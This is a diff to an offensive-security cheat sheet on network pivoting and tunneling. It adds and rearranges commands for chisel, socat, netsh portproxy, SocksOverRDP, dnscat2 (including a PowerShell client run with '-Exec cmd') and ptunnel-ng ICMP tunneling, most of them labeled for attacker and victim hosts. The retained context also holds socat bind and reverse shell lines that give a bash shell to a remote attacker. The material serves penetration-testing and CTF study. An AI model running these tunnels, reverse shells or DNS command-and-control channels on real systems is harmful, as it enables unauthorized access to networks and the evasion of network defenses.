@@ -202,22 +202,6 @@ rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
 ```
 
-## Windows netsh
-
-### Port2Port
-
-You need to be a local admin (for any port)
-
-```bash
-netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
-# Example:
-netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444 
-# Check the port forward was created:
-netsh interface portproxy show v4tov4
-# Delete port forward
-netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
-```
-
 ## reGeorg
 
 [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
@@ -236,16 +220,19 @@ You need to use the **same version for client and server**
 ### socks
 
 ```bash
-./chisel server -p 8080 --reverse #Server
-./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client
+./chisel server -p 8080 --reverse #Server -- Attacker
+./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
 #And now you can use proxychains with port 1080 (default)
+
+./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
+./chisel client -v 10.10.10.10:8080 socks #Attacker
 ```
 
 ### Port forwarding
 
 ```bash
-./chisel_1.7.6_linux_amd64 server -p 12312 --reverse
-./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505
+./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
+./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
 ```
 
 ## Rpivot
@@ -281,7 +268,7 @@ victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntl
 
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
-attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
+attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
 ```
 
 ### Reverse shell
@@ -294,13 +281,13 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ### Port2Port
 
 ```bash
-socat TCP-LISTEN:<lport>,fork TCP:<redirect_ip>:<rport> &
+socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```
 
 ### Port2Port through socks
 
 ```bash
-socat TCP-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
+socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
 
 ### Meterpreter through SSL Socat
@@ -364,6 +351,53 @@ echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
 ```
 
+## Windows netsh
+
+### Port2Port
+
+You need to be a local admin (for any port)
+
+```bash
+netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
+# Example:
+netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444 
+# Check the port forward was created:
+netsh interface portproxy show v4tov4
+# Delete port forward
+netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
+```
+
+## SocksOverRDP & Proxifier
+
+You need to have **RDP access over the system**.\
+Download:
+
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - This tool uses `Dynamic Virtual Channels` (`DVC`) from the Remote Desktop Service feature of Windows. DVC is responsible for **tunneling packets over the RDP connection**.
+2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
+
+In your client computer load **`SocksOverRDP-Plugin.dll`** like this:
+
+```bash
+# Load SocksOverRDP.dll using regsvr32.exe
+C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
+```
+
+Now we can **connect** to the **victim** over **RDP** using **`mstsc.exe`**, and we should receive a **prompt** saying that the **SocksOverRDP plugin is enabled**, and it will **listen** on **127.0.0.1:1080**.
+
+**Connect** via **RDP** and upload & execute in the victim machine the **`SocksOverRDP-Server.exe` ** binary:
+
+```
+C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
+```
+
+Now, confirm in you machine (attacker) that the port 1080 is listening:
+
+```
+netstat -antb | findstr 1080
+```
+
+Now you can use [**Proxifier**](https://www.proxifier.com/) **to proxy the traffic through that port.**
+
 ## Proxify Windows GUI Apps
 
 You can make Windows GUI apps navigate through a proxy using [**Proxifier**](https://www.proxifier.com/).\
@@ -423,14 +457,29 @@ ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 
 ### DNSCat2
 
+****[**Download it from here**](https://github.com/iagox86/dnscat2)**.**
+
 Establishes a C\&C channel through DNS. It doesn't need root privileges.
 
 ```bash
 attacker> ruby ./dnscat2.rb tunneldomain.com
 victim> ./dnscat2 tunneldomain.com
+
+# If using it in an internal network for a CTF:
+attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
+victim> ./dnscat2 --dns host=10.10.10.10,port=5353
 ```
 
-**Port forwarding with dnscat**
+#### **In PowerShell**
+
+You can use [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) to run a dnscat2 client in powershell:
+
+```
+Import-Module .\dnscat2.ps1
+Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd 
+```
+
+#### **Port forwarding with dnscat**
 
 ```bash
 session -i <sessions_id>
@@ -460,11 +509,28 @@ Root is needed in both systems to create tun adapters and tunnel data between th
 ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
 ```
 
+### ptunnel-ng
+
+****[**Download it from here**](https://github.com/utoni/ptunnel-ng.git).
+
+```bash
+# Generate it
+sudo ./autogen.sh 
+
+# Server -- victim (needs to be able to receive ICMP)
+sudo ptunnel-ng
+# Client - Attacker
+sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
+# Try to connect with SSH through ICMP tunnel
+ssh -p 2222 -l user 127.0.0.1
+# Create a socks proxy through the SSH connection through the ICMP tunnel
+ssh -D 9050 -p 2222 -l user 127.0.0.1
+```
+
 ## Other tools to check
 
 * [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 * [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
-* [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
 
 <details>
 
